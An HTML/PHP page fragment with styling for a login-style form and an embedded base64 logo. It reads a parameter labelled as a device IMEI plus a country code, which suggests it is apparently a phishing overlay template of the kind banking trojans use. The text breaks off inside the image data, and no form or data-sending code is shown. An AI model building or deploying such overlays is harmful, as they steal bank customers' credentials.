<html>
<head>
	<style>
		body {
			margin: 0;
			padding: 0;
			color: rgb(255, 104, 3);
		}

		.header > img {
			width: 30%;
			margin-left: 15px;
		}

		hr {
			color: rgb(255, 104, 3);
			border: 2px solid;
		}

		.label {
			margin-left: 15px;
			font-weight: bold;
		}

		.input-field {
			margin-left: 15px;
			margin-top: 5px;
			width: 96%;
			height: 29px;
			margin-bottom: 15px;
			border: 1px solid #fff;
			border-bottom: 2px solid #FF6803;
		}

		.fielderror {
			margin-left: 15px;
			margin-top: 5px;
			width: 96%;
			height: 29px;
			margin-bottom: 15px;
			border: 2px solid #f00;
			border-bottom: 2px solid red;
		}

		.submit-button {
			width: 95%;
			margin-right: 5px;
			height: 38px;
			color: #fff;
			font-weight: bold;
			border: 0px none;
			background-color: #FF6803;
		}
	</style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<div id="content_div">

	<div class="header">
		<img src="data:image/png;base64,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